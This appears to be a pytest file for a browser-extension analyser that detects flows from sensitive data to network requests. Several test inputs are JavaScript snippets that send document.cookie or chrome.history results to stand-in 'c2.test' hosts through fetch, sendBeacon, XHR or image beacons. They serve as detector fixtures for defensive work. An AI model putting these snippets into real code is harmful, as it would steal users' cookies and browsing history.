import time

from extanalyze.analysis.deep.flows import find_flows


def test_callback_param_flows_to_fetch():
    code = "chrome.cookies.getAll({}, c => fetch('https://x.test', {body: JSON.stringify(c)}));"
    flows = find_flows(code)
    assert len(flows) == 1 and flows[0][0] == 1


def test_variable_propagation_across_statements():
    code = """
    const jar = document.cookie;
    const payload = {data: jar, t: Date.now()};
    navigator.sendBeacon('https://c2.test/x', JSON.stringify(payload));
    """
    assert [f[0] for f in find_flows(code)] == [4]


def test_async_source_and_xhr_send():
    code = """
    async function go() {
      const h = await chrome.history.search({text: ''});
      const x = new XMLHttpRequest();
      x.open('POST', 'https://c2.test');
      x.send(JSON.stringify(h));
    }
    """
    assert len(find_flows(code)) == 1


def test_image_beacon_assignment_sink():
    code = "var i = new Image(); i.src = 'https://c2.test/?c=' + document.cookie;"
    assert len(find_flows(code)) == 1


def test_no_flow_when_data_is_unrelated():
    code = """
    chrome.cookies.getAll({}, c => console.log(c.length));
    fetch('https://api.test/status', {method: 'GET'});
    """
    assert find_flows(code) == []


def test_source_without_sink_is_clean():
    assert find_flows("const c = document.cookie; localStorage.setItem('a', c);") == []


def test_deeply_nested_input_does_not_crash_or_hang():
    code = "x = " + "(" * 20000 + "1" + ")" * 20000 + ";"
    t = time.time()
    find_flows(code)
    assert time.time() - t < 10


def test_syntax_errors_are_tolerated():
    assert find_flows("function ( {{{ fetch(document.cookie") is not None
